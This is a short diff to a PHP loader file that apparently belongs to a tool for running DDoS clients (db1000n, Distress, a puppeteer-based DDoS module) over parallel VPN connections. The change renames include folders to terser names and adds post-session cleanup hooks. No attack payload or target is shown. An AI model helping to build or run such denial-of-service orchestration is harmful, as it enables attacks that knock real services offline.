@@ -13,15 +13,16 @@ require_once __DIR__ . '/resources-consumption/LinuxResources.php';
 require_once __DIR__ . '/resources-consumption/ResourcesConsumption.php';
 require_once __DIR__ . '/open-vpn/OpenVpnCommon.php';
 require_once __DIR__ . '/open-vpn/OpenVpnConfig.php';
+require_once __DIR__ . '/open-vpn/OpenVpnConnectionBase.php';
 require_once __DIR__ . '/open-vpn/OpenVpnConnectionStatic.php';
 require_once __DIR__ . '/open-vpn/OpenVpnConnection.php';
 require_once __DIR__ . '/open-vpn/OpenVpnProvider.php';
 require_once __DIR__ . '/open-vpn/OpenVpnStatistics.php';
 require_once __DIR__ . '/HackApplication.php';
-require_once __DIR__ . '/DB1000N/db1000nApplicationStatic.php';
-require_once __DIR__ . '/DB1000N/db1000nApplication.php';
-require_once __DIR__ . '/DISTRESS/DistressApplicationStatic.php';
-require_once __DIR__ . '/DISTRESS/DistressApplication.php';
+require_once __DIR__ . '/1000/db1000nApplicationStatic.php';
+require_once __DIR__ . '/1000/db1000nApplication.php';
+require_once __DIR__ . '/DST/DistressApplicationStatic.php';
+require_once __DIR__ . '/DST/DistressApplication.php';
 
 require_once __DIR__ . '/puppeteer-ddos/BrainServerLauncher.php';
 require_once __DIR__ . '/puppeteer-ddos/PuppeteerApplicationStatic.php';
@@ -124,7 +125,6 @@ function calculateResources()
         $IS_IN_DOCKER = true;
         $DOCKER_HOST = strtolower($dockerHost);
     } else {
-        Actions::addAction('AfterTerminateSession',  'trimDisks');
         $IS_IN_DOCKER = false;
         $DOCKER_HOST = '';
     }
@@ -351,6 +351,16 @@ function calculateResources()
     if (!$PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL) {
         _die("Not enough resources");
     }
+
+    // ---
+
+    if (!$dockerHost) {
+        Actions::addAction('DelayAfterSession', 'trimDisks');
+    }
+    Actions::addAction('DelayAfterSession', 'findAndKillAllZombieProcesses');
+    Actions::addAction('DelayAfterSession', 'gc_collect_cycles');
+
+    // ---
 
     MainLog::log('');
     Actions::doAction('AfterCalculateResources');
